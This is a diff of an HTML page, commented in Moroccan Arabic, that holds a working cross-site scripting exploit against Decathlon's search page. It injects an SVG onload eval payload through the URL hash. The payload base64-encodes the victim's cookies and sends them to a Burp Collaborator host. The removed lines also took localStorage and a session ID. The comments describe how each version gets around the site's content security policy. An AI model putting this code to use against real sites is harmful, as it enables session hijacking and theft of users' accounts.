@@ -2,35 +2,22 @@
 <html>
 <body>
     <script>
-        // الكود اللي غيتنفذ وسط Decathlon
+        // سكريبت كيهرب الداتا عن طريق تحويل الصفحة بالكامل
         let payload = `
             (function(){
-                var data = {
-                    info: "SESS_HIJACK_SUCCESS",
-                    cookies: document.cookie,
-                    ls: JSON.stringify(localStorage),
-                    osid: document.cookie.match(/osid=([^;]+)/)?.[1] || "not_found"
-                };
+                var cookies = btoa(document.cookie);
+                var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?leak=" + cookies;
                 
-                // الرابط ديال Burp Collaborator ديالك
-                var collab = "https://zvyhtnk8jyjp14ieruxdawfp9gf731rq.oastify.com";
-                
-                // صيفط الداتا مشفرة بـ Base64
-                var b64Data = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-                
-                // استعملنا Image() حيت كتهرب من الـ CSP أحسن من fetch
-                var exfil = new Image();
-                exfil.src = collab + "/?leak=" + b64Data;
+                // هاد السطر كيهرب من الـ CSP حيت كيدير Redirect كامل للمتصفح
+                window.location.replace(collab);
             })();
         `;
 
-        // تشفير الـ Payload باش يدوز فـ الـ Hash
         let encodedPayload = encodeURIComponent(payload);
 
-        // الرابط اللي غيضرب Decathlon عن طريق الـ Hash (#)
+        // الرابط باستعمال الـ Hash (#) اللي نفعنا فـ الـ Bypass
         let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";
 
-        // تنفيذ التحويل
         window.location.href = finalTarget;
     </script>
 </body>
